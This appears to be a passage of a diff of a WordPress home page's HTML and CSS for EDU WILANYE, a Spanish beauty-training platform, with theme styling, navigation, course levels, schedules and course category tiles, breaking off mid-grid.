+.wc-block-cart__submit-button:hover,
+body.skin_custom_color .product_status.special,
+body.skin_custom_color .view_type_switcher a:hover,
+body.skin_custom_color .view_type_switcher a.view_list.active_list,
+body.skin_custom_color .view_type_switcher a.view_grid.active_grid,
+body.skin_custom_color .stm_archive_product_inner_unit .stm_archive_product_inner_unit_centered .stm_featured_product_price .price,
+body.skin_custom_color .sidebar-area .widget_text .btn,
+body.skin_custom_color .stm_product_list_widget.widget_woo_stm_style_2 li a .meta .stm_featured_product_price .price,
+body.skin_custom_color .widget_tag_cloud .tagcloud a:hover,
+body.skin_custom_color .sidebar-area .widget ul li a:after,
+body.skin_custom_color .sidebar-area .socials_widget_wrapper .widget_socials li a,
+body.skin_custom_color .socials_widget_wrapper .widget_socials li a,
+body.skin_custom_color .gallery_single_view .gallery_img a:after,
+body.skin_custom_color .course_table tr td.stm_badge .badge_unit,
+body.skin_custom_color .widget_mailchimp .stm_mailchimp_unit .button,
+body.skin_custom_color .textwidget .btn:active,
+body.skin_custom_color .textwidget .btn:focus,
+body.skin_custom_color .form-submit .submit:active,
+body.skin_custom_color .form-submit .submit:focus,
+body.skin_custom_color .button:focus,
+body.skin_custom_color .button:active,
+body.skin_custom_color .btn-default:active,
+body.skin_custom_color .btn-default:focus,
+body.skin_custom_color .button:hover,
+body.skin_custom_color .textwidget .btn:hover,
+body.skin_custom_color .form-submit .submit,
+body.skin_custom_color .button,
+body.skin_custom_color .btn-default,
+.btn.btn-default:hover, .button:hover, .textwidget .btn:hover,
+body.skin_custom_color .short_separator,
+body.skin_custom_color div.multiseparator:after,
+body.skin_custom_color .widget_pages ul.style_2 li a:hover:after,
+body.skin_custom_color.single-product .product .woocommerce-tabs .wc-tabs li.active a:before,
+body.skin_custom_color.woocommerce .sidebar-area .widget .widget_title:after,
+body.skin_custom_color.woocommerce .sidebar-area .widget.widget_price_filter .price_slider_wrapper .price_slider .ui-slider-handle,
+body.skin_custom_color.woocommerce .sidebar-area .widget.widget_price_filter .price_slider_wrapper .price_slider .ui-slider-range,
+.sbc,
+.sbc_h:hover,
+.wpb-js-composer .vc_general.vc_tta.vc_tta-tabs.vc_tta-style-classic li.vc_tta-tab:not(.vc_active)>a,
+.wpb-js-composer .vc_general.vc_tta.vc_tta-tabs.vc_tta-style-classic li.vc_tta-tab:not(.vc_active)>a:hover,
+#header.transparent_header .header_2 .stm_lms_account_dropdown .dropdown button,
+.stm_lms_courses_categories.style_3 .stm_lms_courses_category>a:hover,
+.stm_lms_udemy_course .nav.nav-tabs>li a,
+body.classic_lms .classic_style .nav.nav-tabs>li.active a,
+.header_bottom:after,
+.sbc:hover,
+body.rtl-demo .stm_testimonials_wrapper_style_2 .stm_lms_testimonials_single__content,
+.masterstudy_stm_video.style_2 .stm_theme_wpb_video_wrapper .stm_video_preview:after
+{background-color:#1E1E1E;}
+						.wc-block-checkout__actions_row .wc-block-components-checkout-place-order-button:hover, 
+.wc-block-components-totals-coupon__form .wc-block-components-totals-coupon__button:hover,
+.wc-block-cart__submit-button:hover,
+body.skin_custom_color.woocommerce .sidebar-area .widget.widget_layered_nav ul li a:after,
+body.skin_custom_color.woocommerce .sidebar-area .widget.widget_product_categories ul li a:after,
+body.skin_custom_color .wpb_tabs .form-control:focus,
+body.skin_custom_color .wpb_tabs .form-control:active,
+body.skin_custom_color .woocommerce .cart-totals_wrap .shipping-calculator-button,
+body.skin_custom_color .sidebar-area .widget_text .btn,
+body.skin_custom_color .widget_tag_cloud .tagcloud a:hover,
+body.skin_custom_color .icon_box.dark a:hover,
+body.skin_custom_color .simple-carousel-bullets a.selected,
+body.skin_custom_color .stm_sign_up_form .form-control:active,
+body.skin_custom_color .stm_sign_up_form .form-control:focus,
+body.skin_custom_color .form-submit .submit,
+body.skin_custom_color .button,
+body.skin_custom_color .btn-default,
+.sbrc,
+.sbrc_h:hover,
+.vc_general.vc_tta.vc_tta-tabs,
+body.skin_custom_color .blog_layout_grid .post_list_meta_unit,
+body.skin_custom_color .blog_layout_grid .post_list_meta_unit .post_list_comment_num,
+body.skin_custom_color .blog_layout_list .post_list_meta_unit .post_list_comment_num,
+body.skin_custom_color .blog_layout_list .post_list_meta_unit,
+body.tech .stm_lms_points_history__head .left a:hover,
+#header.transparent_header .header_2 .stm_lms_account_dropdown .dropdown button,
+.masterstudy_stm_video.style_2 .stm_theme_wpb_video_wrapper .stm_video_preview:after
+{border-color:#1E1E1E;}
+.header_2_top_bar__inner .top_bar_right_part .header_top_bar_socs ul li a:hover,
+.secondary_color,
+body.skin_custom_color.single-product .product .woocommerce-tabs .wc-tabs li.active a,
+body.skin_custom_color.single-product .product .woocommerce-tabs .wc-tabs li a:hover,
+body.skin_custom_color .widget_pages ul.style_2 li a:hover .h6,
+body.skin_custom_color .icon_box .icon_text>h3>span,
+body.skin_custom_color .stm_woo_archive_view_type_list .stm_featured_product_stock i,
+body.skin_custom_color .stm_woo_archive_view_type_list .expert_unit_link:hover .expert,
+body.skin_custom_color .stm_archive_product_inner_unit .stm_archive_product_inner_unit_centered .stm_featured_product_body a .title:hover,
+body.skin_custom_color .stm_product_list_widget.widget_woo_stm_style_2 li a:hover .title,
+body.skin_custom_color .blog_layout_grid .post_list_meta_unit .post_list_comment_num,
+body.skin_custom_color .blog_layout_grid .post_list_meta_unit .date-m,
+body.skin_custom_color .blog_layout_grid .post_list_meta_unit .date-d,
+body.skin_custom_color .blog_layout_list .post_list_meta_unit .post_list_comment_num,
+body.skin_custom_color .blog_layout_list .post_list_meta_unit .date-m,
+body.skin_custom_color .blog_layout_list .post_list_meta_unit .date-d,
+body.skin_custom_color .widget_product_search .woocommerce-product-search:after,
+body.skin_custom_color .widget_search .search-form > label:after,
+body.skin_custom_color .sidebar-area .widget ul li a,
+body.skin_custom_color .sidebar-area .widget_categories ul li a,
+body.skin_custom_color .widget_contacts ul li .text a,
+body.skin_custom_color .event-col .event_archive_item > a:hover .title,
+body.skin_custom_color .stm_contact_row a:hover,
+body.skin_custom_color .comments-area .commentmetadata i,
+body.skin_custom_color .stm_post_info .stm_post_details .comments_num .post_comments:hover,
+body.skin_custom_color .stm_post_info .stm_post_details .comments_num .post_comments i,
+body.skin_custom_color .stm_post_info .stm_post_details .post_meta li a:hover span,
+body.skin_custom_color .stm_post_info .stm_post_details .post_meta li i,
+body.skin_custom_color .blog_layout_list .post_list_item_tags .post_list_divider,
+body.skin_custom_color .blog_layout_list .post_list_item_tags a,
+body.skin_custom_color .blog_layout_list .post_list_cats .post_list_divider,
+body.skin_custom_color .blog_layout_list .post_list_cats a,
+body.skin_custom_color .blog_layout_list .post_list_item_title a:hover,
+body.skin_custom_color .blog_layout_grid .post_list_item_tags .post_list_divider,
+body.skin_custom_color .blog_layout_grid .post_list_item_tags a,
+body.skin_custom_color .blog_layout_grid .post_list_cats .post_list_divider,
+body.skin_custom_color .blog_layout_grid .post_list_cats a,
+body.skin_custom_color .blog_layout_grid .post_list_item_title:focus,
+body.skin_custom_color .blog_layout_grid .post_list_item_title:active,
+body.skin_custom_color .blog_layout_grid .post_list_item_title:hover,
+body.skin_custom_color .stm_featured_products_unit .stm_featured_product_single_unit .stm_featured_product_single_unit_centered .stm_featured_product_body a .title:hover,
+body.skin_custom_color .icon_box.dark a:hover,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_item_tags .post_list_divider,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_item_tags a,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_cats .post_list_divider,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_cats a,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_item_title:active,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_item_title:focus,
+body.skin_custom_color .post_list_main_section_wrapper .post_list_item_title:hover,
+body.skin_custom_color a:hover,
+.secondary_color,
+#header.transparent_header .header_2 .header_top .stm_lms_categories .heading_font,
+#header.transparent_header .header_2 .header_top .stm_lms_categories i,
+.classic_lms .post_list_main_section_wrapper .post_list_cats a,
+.classic_lms .post_list_main_section_wrapper .post_list_item_tags a,
+body.skin_custom_color .single_product_after_title .meta-unit.teacher:hover .value,
+.stm_lms_course_sticky_panel__teacher:before,
+.stm_lms_courses__single__inner .stm_lms_courses__single--info_title a:hover h4
+{color:#1E1E1E;}a{color:#1E1E1E;}body,
+                    .normal_font,
+                    .h6.normal_font,
+                    body.rtl.rtl-demo .stm_testimonials_wrapper_style_2 .stm_lms_testimonials_single__excerpt p,
+                    .stm_product_list_widget.widget_woo_stm_style_2 li a .meta .title{font-family:"Open Sans";color:#273044;font-size:14px;}.btn, .header-login-button.sign-up a{font-family:Montserrat;line-height:14px;font-size:14px;}.header-menu{font-family:Montserrat;font-weight:normal;color:#fff;}h1,.h1,h2,.h2,h3,.h3,h4,.h4,h5,.h5,h6,.h6,.nav-tabs>li>a,.member-name,.section-title,.user-name,.heading_font,.item-title,.acomment-meta,[type="reset"],.bp-subnavs,.activity-header,table,.widget_categories ul li a,.sidebar-area .widget ul li a,.select2-selection__rendered,blockquote,.select2-chosen,.vc_tta-tabs.vc_tta-tabs-position-top .vc_tta-tabs-container .vc_tta-tabs-list li.vc_tta-tab a,.vc_tta-tabs.vc_tta-tabs-position-left .vc_tta-tabs-container .vc_tta-tabs-list li.vc_tta-tab a, body.distance-learning .btn, body.distance-learning .vc_btn3{font-family:Montserrat;color:#273044;}h1,.h1{line-height:45px;letter-spacing:-0.4px;font-size:35px;}h2,.h2{line-height:36px;letter-spacing:-0.4px;font-weight:400;font-size:30px;}h3,.h3{line-height:34px;letter-spacing:-1px;font-weight:400;font-size:24px;}h4,.h4,blockquote{line-height:26px;letter-spacing:-0.5px;font-size:16px;}h5,.h5,.select2-selection__rendered{line-height:20px;font-size:14px;}h6,.h6,.widget_pages ul li a, .widget_nav_menu ul li a, .footer_menu li a,.widget_categories ul li a,.sidebar-area .widget ul li a{line-height:12px;font-weight:400;font-size:12px;}#footer_top{background-color:#414b4f;}#footer_bottom{background-color:#ffffff;}#footer_bottom .widget_title h3{font-weight:700;color:#273044;font-size:18px;}#footer_bottom, .widget_contacts ul li .text,
+												#footer_bottom .footer_widgets_wrapper .widget ul li a,
+												.widget_nav_menu ul.style_1 li a .h6,
+												.widget_pages ul.style_2 li a .h6,
+												#footer .stm_product_list_widget.widget_woo_stm_style_2 li a .meta .title,
+												.widget_pages ul.style_1 li a .h6, #footer_bottom .widget_stm_recent_posts .widget_media .h6{color:#aaaaaa;}.widget_pages ul.style_2 li a:after{background-color:#aaaaaa;}</style></head>
+
+<body class="home wp-singular page-template page-template-elementor_header_footer page page-id-972 wp-embed-responsive wp-theme-kadence stm_lms_infinite translatepress-es_ES footer-on-bottom hide-focus-outline link-style-standard content-title-style-above content-width-normal content-style-boxed content-vertical-padding-show non-transparent-header mobile-non-transparent-header kadence-elementor-colors elementor-default elementor-template-full-width elementor-kit-20 elementor-page elementor-page-972">
+<div id="wrapper" class="site wp-site-blocks">
+			<a class="skip-link screen-reader-text scroll-ignore" href="#main">Saltar al contenido</a>
+		<header id="masthead" class="site-header" role="banner" itemtype="https://schema.org/WPHeader" itemscope>
+	<div id="main-header" class="site-header-wrap">
+		<div class="site-header-inner-wrap">
+			<div class="site-header-upper-wrap">
+				<div class="site-header-upper-inner-wrap">
+					<div class="site-main-header-wrap site-header-row-container site-header-focus-item site-header-row-layout-standard" data-section="kadence_customizer_header_main">
+	<div class="site-header-row-container-inner">
+				<div class="site-container">
+			<div class="site-main-header-inner-wrap site-header-row site-header-row-has-sides site-header-row-no-center">
+									<div class="site-header-main-section-left site-header-section site-header-section-left">
+						<div class="site-header-item site-header-focus-item" data-section="title_tagline">
+	<div class="site-branding branding-layout-standard"><a class="brand" href="https://edu.wilanye.com/" rel="home"><div class="site-title-wrap"><p class="site-title">EDU WILANYE</p></div></a></div></div><!-- data-section="title_tagline" -->
+					</div>
+																	<div class="site-header-main-section-right site-header-section site-header-section-right">
+						<div class="site-header-item site-header-focus-item site-header-item-main-navigation header-navigation-layout-stretch-false header-navigation-layout-fill-stretch-false" data-section="kadence_customizer_primary_navigation">
+	    <nav id="site-navigation" class="main-navigation header-navigation hover-to-open nav--toggle-sub header-navigation-style-standard header-navigation-dropdown-animation-none" role="navigation" aria-label="Navegación primaria">
+            <div class="primary-menu-container header-menu-container">
+    <ul id="primary-menu" class="menu"><li id="menu-item-5144" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-972 current_page_item menu-item-5144"><a href="https://edu.wilanye.com/" aria-current="page">INICIO</a></li>
+<li id="menu-item-974" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-974"><a href="https://edu.wilanye.com/courses/">ACADEMIA</a></li>
+<li id="menu-item-5131" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5131"><a href="https://edu.wilanye.com/eventos/">EVENTOS</a></li>
+<li id="menu-item-976" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-976"><a href="https://edu.wilanye.com/sobre/">SOBRE NOSOTROS</a></li>
+<li id="menu-item-977" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-977"><a href="https://edu.wilanye.com/contact-us/">CONTACTO</a></li>
+</ul>        </div>
+    </nav><!-- #site-navigation -->
+    </div><!-- data-section="primary_navigation" -->
+<div class="site-header-item site-header-focus-item" data-section="kadence_customizer_header_button">
+	<div class="header-button-wrap vs-logged-in-false"><div class="header-button-inner-wrap"><a href="https://edu.wilanye.com/acceso" target="_self" class="button header-button button-size-medium button-style-filled">ACCEDER</a></div></div></div><!-- data-section="header_button" -->
+					</div>
+							</div>
+		</div>
+	</div>
+</div>
+				</div>
+			</div>
+					</div>
+	</div>
+	
+<div id="mobile-header" class="site-mobile-header-wrap">
+	<div class="site-header-inner-wrap">
+		<div class="site-header-upper-wrap">
+			<div class="site-header-upper-inner-wrap">
+			<div class="site-main-header-wrap site-header-focus-item site-header-row-layout-standard site-header-row-tablet-layout-default site-header-row-mobile-layout-default ">
+	<div class="site-header-row-container-inner">
+		<div class="site-container">
+			<div class="site-main-header-inner-wrap site-header-row site-header-row-has-sides site-header-row-no-center">
+									<div class="site-header-main-section-left site-header-section site-header-section-left">
+						<div class="site-header-item site-header-focus-item" data-section="title_tagline">
+	<div class="site-branding mobile-site-branding branding-layout-standard branding-tablet-layout-inherit branding-mobile-layout-inherit"><a class="brand" href="https://edu.wilanye.com/" rel="home"><div class="site-title-wrap"><div class="site-title vs-md-false">EDU WILANYE</div></div></a></div></div><!-- data-section="title_tagline" -->
+					</div>
+																	<div class="site-header-main-section-right site-header-section site-header-section-right">
+						<div class="site-header-item site-header-focus-item site-header-item-navgation-popup-toggle" data-section="kadence_customizer_mobile_trigger">
+		<div class="mobile-toggle-open-container">
+						<button id="mobile-toggle" class="menu-toggle-open drawer-toggle menu-toggle-style-default" aria-label="Abrir menú" data-toggle-target="#mobile-drawer" data-toggle-body-class="showing-popup-drawer-from-right" aria-expanded="false" data-set-focus=".menu-toggle-close"
+					>
+						<span class="menu-toggle-icon"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-menu-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Alternar el menú</title><path d="M3 13h18c0.552 0 1-0.448 1-1s-0.448-1-1-1h-18c-0.552 0-1 0.448-1 1s0.448 1 1 1zM3 7h18c0.552 0 1-0.448 1-1s-0.448-1-1-1h-18c-0.552 0-1 0.448-1 1s0.448 1 1 1zM3 19h18c0.552 0 1-0.448 1-1s-0.448-1-1-1h-18c-0.552 0-1 0.448-1 1s0.448 1 1 1z"></path>
+				</svg></span></span>
+		</button>
+	</div>
+	</div><!-- data-section="mobile_trigger" -->
+<div class="site-header-item site-header-focus-item" data-section="kadence_customizer_mobile_button">
+	<div class="mobile-header-button-wrap vs-logged-in-false"><div class="mobile-header-button-inner-wrap"><a href="https://edu.wilanye.com/acceso" target="_self" class="button mobile-header-button button-size-medium button-style-filled">ACCEDER</a></div></div></div><!-- data-section="mobile_button" -->
+					</div>
+							</div>
+		</div>
+	</div>
+</div>
+			</div>
+		</div>
+			</div>
+</div>
+</header><!-- #masthead -->
+
+	<div id="inner-wrap" class="wrap kt-clear">
+				<div data-elementor-type="wp-page" data-elementor-id="972" class="elementor elementor-972">
+				<div class="elementor-element elementor-element-72a238e e-con-full e-flex e-con e-parent" data-id="72a238e" data-element_type="container">
+				<div class="elementor-element elementor-element-6d8beb0 elementor-widget__width-inherit elementor-widget elementor-widget-video" data-id="6d8beb0" data-element_type="widget" data-settings="{&quot;video_type&quot;:&quot;hosted&quot;,&quot;start&quot;:1,&quot;end&quot;:60,&quot;autoplay&quot;:&quot;yes&quot;,&quot;play_on_mobile&quot;:&quot;yes&quot;,&quot;mute&quot;:&quot;yes&quot;,&quot;loop&quot;:&quot;yes&quot;}" data-widget_type="video.default">
+				<div class="elementor-widget-container">
+							<div class="e-hosted-video elementor-wrapper elementor-open-inline">
+					<video class="elementor-video" src="https://edu.wilanye.com/wp-content/uploads/2025/07/Grey-Minimalist-Marketing-YouTube-Video-Intro.mp4#t=1,60" autoplay="" loop="" muted="muted" playsinline="" controlsList="nodownload"></video>
+				</div>
+						</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-e3cf5fd e-flex e-con-boxed e-con e-parent" data-id="e3cf5fd" data-element_type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-2d13210 elementor-widget elementor-widget-link-in-bio" data-id="2d13210" data-element_type="widget" data-widget_type="link-in-bio.default">
+				<div class="elementor-widget-container">
+							<div class="e-link-in-bio e-link-in-bio">
+			<div class="e-link-in-bio__content">
+
+						<div class="e-link-in-bio__identity">
+									<div class="e-link-in-bio__identity-image e-link-in-bio__identity-image-profile has-style-circle">
+							<img fetchpriority="high" decoding="async" width="300" height="300" src="https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-300x300.png" class="e-link-in-bio__identity-image-element" alt="" srcset="https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-300x300.png 300w, https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-150x150.png 150w, https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-75x75.png 75w, https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-129x129.png 129w, https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-69x69.png 69w, https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512-100x100.png 100w, https://edu.wilanye.com/wp-content/uploads/2024/11/maskable_icon_x512.png 512w" sizes="(max-width: 300px) 100vw, 300px" />													</div>
+							</div>
+					<div class="e-link-in-bio__bio">
+				<h1 class="e-link-in-bio__heading">EDU WILANYE</h1>				<h2 class="e-link-in-bio__title">Plataforma especializada</h2>								<p class="e-link-in-bio__description">EDU WILANYE se trata de la primera plataforma  especializada en la belleza que contará con una metodología de enseñanza moderna mediante tecnologías LMS web que se utiliza para administrar, distribuir y hacer seguimiento de cursos y actividades de aprendizaje digitalmente
+
+Primeramente comenzará presencial adoptando un plan de estudio inspirado en academias internacionales de manera continúa los cuales se dividirán por niveles con sus respectivas insignias 
+
+Nivel 1 (Artista) Artist
+
+Nivel 2 (Artista TOP) Top Artist
+
+Nivel 3 (Maestro) Master 
+
+Cada nivel se dividirán por 3 semanas con 2 o 1 clase semanal:
+
+- DIURNO 2 clases semanales por 3h c/u
+
+- VESPERTINO 2 clases semanales por 3h c/u
+
+- SABATINO 1 clase semanal por 6h c/u</p>			</div>
+					<div class="e-link-in-bio__icons has-size-small">
+							<div class="e-link-in-bio__icon is-size-small">
+					<a target="_blank" rel="noopener " aria-label="Facebook" class="e-link-in-bio__icon-link" href="">
+						<span class="e-link-in-bio__icon-svg">
+							<svg aria-hidden="true" class="e-font-icon-svg e-fab-facebook" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg>						</span>
+											</a>
+				</div>
+							<div class="e-link-in-bio__icon is-size-small">
+					<a target="_blank" rel="noopener " aria-label="Instagram" class="e-link-in-bio__icon-link" href="">
+						<span class="e-link-in-bio__icon-svg">
+							<svg aria-hidden="true" class="e-font-icon-svg e-fab-instagram" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path></svg>						</span>
+											</a>
+				</div>
+							<div class="e-link-in-bio__icon is-size-small">
+					<a target="_blank" rel="noopener " aria-label="TikTok" class="e-link-in-bio__icon-link" href="">
+						<span class="e-link-in-bio__icon-svg">
+							<svg aria-hidden="true" class="e-font-icon-svg e-fab-tiktok" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"></path></svg>						</span>
+											</a>
+				</div>
+					</div>
+		
+		<div class="e-link-in-bio__ctas has-type-button">
+							<a target="_blank" rel="noopener " class="e-link-in-bio__cta is-type-button has-corners-rounded" href="">
+										<span class="e-link-in-bio__cta-text">
+						NIVEL 1 ARTIST					</span>
+				</a>
+							<a target="_blank" rel="noopener " class="e-link-in-bio__cta is-type-button has-corners-rounded" href="">
+										<span class="e-link-in-bio__cta-text">
+						NIVEL 2 TOP ARTIST					</span>
+				</a>
+							<a target="_blank" rel="noopener " class="e-link-in-bio__cta is-type-button has-corners-rounded" href="">
+										<span class="e-link-in-bio__cta-text">
+						NIVEL 3 MASTER					</span>
+				</a>
+					</div>
+		
+			</div>
+			<div class="e-link-in-bio__bg">
+				<div class="e-link-in-bio__bg-overlay"></div>
+			</div>
+		</div>
+						</div>
+				</div>
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-9aa06fe e-flex e-con-boxed e-con e-parent" data-id="9aa06fe" data-element_type="container">
+					<div class="e-con-inner">
+					</div>
+				</div>
+		<div class="elementor-element elementor-element-f3ac01f e-flex e-con-boxed e-con e-parent" data-id="f3ac01f" data-element_type="container">
+					<div class="e-con-inner">
+					</div>
+				</div>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-67e16b5 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="67e16b5" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-67e1aa9" data-id="67e1aa9" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-67e1ea8 elementor-widget elementor-widget-stm_lms_courses_categories" data-id="67e1ea8" data-element_type="widget" data-widget_type="stm_lms_courses_categories.default">
+				<div class="elementor-widget-container">
+							<div class="stm_lms_courses_categories style_2">
+
+							<div class="stm_lms_courses_category stm_lms_courses_category__0 stm_lms_courses_category_wide">
+			
+				<a href="https://edu.wilanye.com/courses/?terms%5B%5D=141&#038;category%5B%5D=141"
+					title="CEJAS"
+					class="no_deco wide">
+
+					
+					<div class="stm_lms_courses_category__image">
+						<div class="stm_lms_courses_categories__holder" style="width: 770px"></div>					</div>
+
+					<div class="stm_lms_courses_category__info">
+						<h4>CEJAS</h4>
+						<span>
+							0 cursos						</span>
+					</div>
+				</a>
+
+								</div>
+			
+							<div class="stm_lms_courses_category stm_lms_courses_category__1 stm_lms_courses_category_default">
+			
+				<a href="https://edu.wilanye.com/courses/?terms%5B%5D=142&#038;category%5B%5D=142"
+					title="PESTAÑAS"
+					class="no_deco default">
+
+					
+					<div class="stm_lms_courses_category__image">
+						<div class="stm_lms_courses_categories__holder" style="width: 370px"></div>					</div>
+
+					<div class="stm_lms_courses_category__info">
+						<h4>PESTAÑAS</h4>
+						<span>
+							0 cursos						</span>
+					</div>
+				</a>
+
+				
+			
+				<a href="https://edu.wilanye.com/courses/?terms%5B%5D=143&#038;category%5B%5D=143"
+					title="MAKEUP"
+					class="no_deco default">
+
+					
+					<div class="stm_lms_courses_category__image">
+						<div class="stm_lms_courses_categories__holder" style="width: 370px"></div>					</div>
+
+					<div class="stm_lms_courses_category__info">
+						<h4>MAKEUP</h4>
+						<span>
+							0 cursos						</span>
+					</div>
+				</a>
+
+								</div>
+			
+							<div class="stm_lms_courses_category stm_lms_courses_category__3 stm_lms_courses_category_default">
+			
+				<a href="https://edu.wilanye.com/courses/?terms%5B%5D=144&#038;category%5B%5D=144"
+					title="NAILS"
+					class="no_deco default">
+
+					
+					<div class="stm_lms_courses_category__image">
+						<div class="stm_lms_courses_categories__holder" style="width: 370px"></div>					</div>
+
+					<div class="stm_lms_courses_category__info">
+						<h4>NAILS</h4>
+						<span>
+							2 cursos						</span>
+					</div>
+				</a>
+
+								</div>
+			
+							<div class="stm_lms_courses_category stm_lms_courses_category__4 stm_lms_courses_category_default">
+			
+				<a href="https://edu.wilanye.com/courses/?terms%5B%5D=145&#038;category%5B%5D=145"
+					title="ESTILISMO"
+					class="no_deco default">
+
+					
+					<div class="stm_lms_courses_category__image">
+						<div class="stm_lms_courses_categories__holder" style="width: 370px"></div>					</div>
+
+					<div class="stm_lms_courses_category__info">
+						<h4>ESTILISMO</h4>
+						<span>
+							0 cursos						</span>
+					</div>
+				</a>
+
+								</div>
+			
+							<div class="stm_lms_courses_category stm_lms_courses_category__5 stm_lms_courses_category_default">
+			
+				<a href="https://edu.wilanye.com/courses/?terms%5B%5D=146&#038;category%5B%5D=146"
+					title="COMUNICACIONAL"
+					class="no_deco default">
+
+					
+					<div class="stm_lms_courses_category__image">
+						<div class="stm_lms_courses_categories__holder" style="width: 370px"></div>					</div>
+
+					<div class="stm_lms_courses_category__info">
+						<h4>COMUNICACIONAL</h4>
+						<span>
+							0 cursos						</span>
+					</div>
+				</a>
+
+								</div>
+			
+					</div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-67e1f7d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="67e1f7d" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-67e23b6" data-id="67e23b6" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-67e2cf5 elementor-widget elementor-widget-stm_lms_courses_grid" data-id="67e2cf5" data-element_type="widget" data-widget_type="stm_lms_courses_grid.default">
+				<div class="elementor-widget-container">
+					
+<div class="stm_lms_courses_grid stm_lms_courses">
+
+	<div class="stm_lms_courses_grid__top hidden">
+		<div class="stm_lms_courses_grid__counter">
+							<h3>
+					Total: <strong>2 cursos</strong>					<a class="stm_lms_courses_grid__all" href="https://edu.wilanye.com/courses/">
+						Ver todo					</a>
+				</h3>
+					</div>
+		<div class="stm_lms_courses_grid__sort heading_font stm_lms_grid_sort_module showing"
+				data-text="Ordenar por:">
+			<select class="no-search">
+				<option value="date_high">Fecha de lanzamiento (los más recientes primero)</option>
+				<option value="date_low">Fecha de lanzamiento (los más antiguos primero)</option>
+									<option value="rating">Puntuación general</option>
+								<option value="popular">Popular (lo más visto)</option>
+			</select>
+		</div>
+	</div>
+
+					<div class="stm_lms_courses__grid stm_lms_courses__grid_4 stm_lms_courses__grid_center  stm_lms_courses__grid_found_2"
+		data-pages="1">
+	
+	
+<div class="stm_lms_courses__single stm_lms_courses__single_animation no-sale style_3">
+
+	<div class="stm_lms_courses__single__inner">
+
+		<div class="stm_lms_courses__single__inner__image">
+
+			
+<div class="stm_lms_courses__single--image">
+
+		<div class="featured-course-container">
+			</div>
+	
+	<a href="https://edu.wilanye.com/courses/artista-en-unas-nocturno/"
+	class="heading_font"
+	data-preview="Vista previa de este curso">
+		<div class="stm_lms_courses__single--image__container" data-height=250px>
